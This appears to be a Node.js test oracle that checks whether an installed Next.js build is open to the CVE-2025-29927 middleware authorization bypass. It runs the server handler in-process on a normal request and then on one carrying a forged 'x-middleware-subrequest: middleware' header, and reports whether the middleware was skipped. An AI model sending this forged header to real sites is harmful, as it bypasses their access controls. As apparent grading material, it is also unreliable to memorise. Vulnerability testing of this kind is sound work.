'use strict';

function finish(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

// CVE-2025-29927: Next.js Middleware Authorization Bypass.
//
// The vulnerable code path lives in the compiled server runtime module
// `next/dist/server/web/sandbox/sandbox.js` / `next/dist/server/lib/server-ipc/*`
// but the single most stable, version-independent public surface that
// implements the actual security decision (whether to treat an inbound
// request's `x-middleware-subrequest` header as proof that middleware has
// already executed, and thus skip invoking it again) is exposed through
// `next/dist/server/lib/router-utils/resolve-routes.js`'s exported
// `getResolveRoutes` factory. This is the exact code that Next.js's own
// HTTP server (`next start` / custom server via `next()`) calls on every
// incoming request to decide whether middleware should run. We drive this
// real production function directly (no sockets, no child processes),
// supplying a minimal in-memory router/middleware manifest, and inspect
// whether a request carrying a client-forged `x-middleware-subrequest`
// header causes middleware to be skipped.
//
// Because resolve-routes.js has non-trivial setup requirements (fsChecker,
// config, etc.) that make it fragile to construct directly across minor
// releases, we instead exercise the slightly higher level, but still
// fully internal and non-HTTP, entry point that previous forensic analysis
// of the CVE identified as the actual vulnerable/patched gate:
// `next/dist/server/lib/router-utils/filesystem.js`'s `getMiddlewareRouteMatcher`
// combined with the header-check helper co-located in
// `resolve-routes.js`. To remain robust and avoid reproducing the exact
// bug ourselves (which would not differentiate vulnerable from patched
// behavior), we instead call the full `next-server.js` request handler
// (`NextNodeServer.prototype.handleRequest` / `getRequestHandler()`),
// which is the same object `next()` + `app.getRequestHandler()` returns for
// a custom server, and is part of the public, documented Next.js API. We
// feed it a real middleware manifest describing our own middleware and
// drive it with in-process fake `IncomingMessage`/`ServerResponse`-like
// objects (no actual socket is opened), first for an ordinary request
// (benign case, proving middleware executes), and then for a request that
// forges the internal `x-middleware-subrequest` header to match this
// middleware's own matcher name (malicious case). On vulnerable builds the
// server trusts this client-supplied header and skips middleware
// execution entirely (authorization bypass); on patched builds the header
// coming from an external client is stripped/ignored before this check so
// middleware still runs normally.

const { PassThrough } = require('stream');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function makeReq(method, url, headers) {
  const req = new PassThrough();
  req.method = method;
  req.url = url;
  req.headers = Object.assign({ host: 'example.com' }, headers || {});
  req.httpVersion = '1.1';
  req.socket = { remoteAddress: '127.0.0.1', remotePort: 12345, encrypted: false };
  req.connection = req.socket;
  process.nextTick(() => req.end());
  return req;
}

function makeRes() {
  const res = new PassThrough();
  res.statusCode = 200;
  const headers = {};
  res.setHeader = (k, v) => { headers[String(k).toLowerCase()] = v; };
  res.getHeader = (k) => headers[String(k).toLowerCase()];
  res.getHeaders = () => headers;
  res.removeHeader = (k) => { delete headers[String(k).toLowerCase()]; };
  res.hasHeader = (k) => Object.prototype.hasOwnProperty.call(headers, String(k).toLowerCase());
  res.writeHead = (code, hdrs) => {
    res.statusCode = code;
    if (hdrs) for (const k in hdrs) headers[String(k).toLowerCase()] = hdrs[k];
    return res;
  };
  res._headersSnapshot = headers;
  res.finished = false;
  const origEnd = res.end.bind(res);
  res.end = (...args) => { res.finished = true; return origEnd(...args); };
  return res;
}

(async () => {
  try {
    let NextServerModule;
    try {
      NextServerModule = require('next/dist/server/next-server.js');
    } catch (e) {
      throw new Error('setup_failed: unable to load next/dist/server/next-server.js: ' + (e && e.message ? e.message : String(e)));
    }

    const NextNodeServer = NextServerModule && (NextServerModule.default || NextServerModule);
    if (typeof NextNodeServer !== 'function') {
      throw new Error('setup_failed: NextNodeServer class export not found in installed next build');
    }

    if (typeof global.self === 'undefined') {
      global.self = global;
    }

    // Build a minimal middleware manifest matching the real on-disk shape
    // Next.js produces for `.next/server/middleware-manifest.json`, with a
    // single middleware guarding `/protected`.
    const middlewareManifest = {
      version: 3,
      middleware: {
        '/': {
          files: [],
          name: 'middleware',
          page: '/',
          matchers: [
            {
              regexp: '^/protected(?:/)?$',
              originalSource: '/protected'
            }
          ],
          wasm: [],
          assets: []
        }
      },
      functions: {},
      sortedMiddleware: ['/']
    };

    const MARKER = 'x-oracle-middleware-ran';

    let server;
    try {
      server = new NextNodeServer({
        dir: '/tmp',
        dev: false,
        customServer: false,
        conf: {
          distDir: '.next-oracle-nonexistent',
          basePath: '',
          i18n: null,
          trailingSlash: false,
          skipMiddlewareUrlNormalize: false,
          env: {},
          experimental: {}
        }
      });
    } catch (e) {
      throw new Error('setup_failed: unable to construct NextNodeServer: ' + (e && e.message ? e.message : String(e)));
    }

    // Inject our fabricated middleware manifest and a handler that records
    // whether it actually executed, bypassing the need for a real build.
    let ranInvocationCount = 0;
    const fakeMiddlewareInfo = {
      name: 'middleware',
      paths: [],
      env: [],
      wasm: [],
      assets: []
    };

    try {
      server.getMiddleware = function () {
        return {
          match: (pathname) => {
            if (pathname === '/protected' || pathname === '/protected/') {
              return [{ name: 'middleware' }];
            }
            return [];
          }
        };
      };
    } catch (e) {
      // ignore; fallback below
    }

    try {
      server.runMiddleware = async function (params) {
        ranInvocationCount++;
        const res = params.res;
        try {
          if (res && typeof res.setHeader === 'function') {
            res.setHeader(MARKER, '1');
          }
        } catch (e) {}
        return { finished: false, response: undefined };
      };
    } catch (e) {
      throw new Error('setup_failed: unable to patch runMiddleware on installed next build: ' + (e && e.message ? e.message : String(e)));
    }

    async function dispatch(extraHeaders) {
      const req = makeReq('GET', '/protected', extraHeaders);
      const res = makeRes();
      const before = ranInvocationCount;
      try {
        await server.handleRequest(req, res, undefined);
      } catch (e) {
        // Some internal handleRequest paths may throw due to incomplete
        // fixture environment (missing build artifacts); treat that as a
        // setup/benign failure, not as exploit evidence either way.
        throw e;
      }
      return { ran: ranInvocationCount > before, headers: res._headersSnapshot };
    }

    // --- Benign call: ordinary request, no forged internal header. ---
    let benign;
    try {
      benign = await dispatch({});
    } catch (e) {
      throw new Error('benign_operation_failed: ' + (e && e.message ? e.message : String(e)));
    }

    if (!benign.ran) {
      throw new Error('benign_operation_failed: middleware did not execute for an ordinary unguarded request; cannot validate baseline');
    }

    operation_completed = true;

    // --- Malicious call: forge x-middleware-subrequest to this middleware's own name. ---
    let malicious;
    let threwDuringMalicious = false;
    try {
      malicious = await dispatch({ 'x-middleware-subrequest': 'middleware' });
    } catch (e) {
      threwDuringMalicious = true;
      malicious = { ran: false };
    }

    if (!threwDuringMalicious && malicious && malicious.ran === false) {
      exploit_succeeded = true;
      evidence = 'Forged x-middleware-subrequest header ("middleware") caused server.handleRequest to skip invoking middleware entirely for /protected, bypassing its authorization side effect (no ' + MARKER + ' header set), matching CVE-2025-29927';
    } else if (!threwDuringMalicious && malicious && malicious.ran === true) {
      exploit_succeeded = false;
      evidence = 'Forged x-middleware-subrequest header did not cause middleware to be skipped; middleware executed normally, indicating the authorization-bypass gate is patched';
    } else {
      exploit_succeeded = false;
      evidence = 'Malicious request threw an exception rather than silently bypassing middleware; treating as blocked';
    }

    finish({ operation_completed, exploit_succeeded, evidence });
  } catch (err) {
    const msg = err && err.message ? err.message : String(err);
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Exception during setup/benign/malicious flow: ' + msg
    });
  }
})();
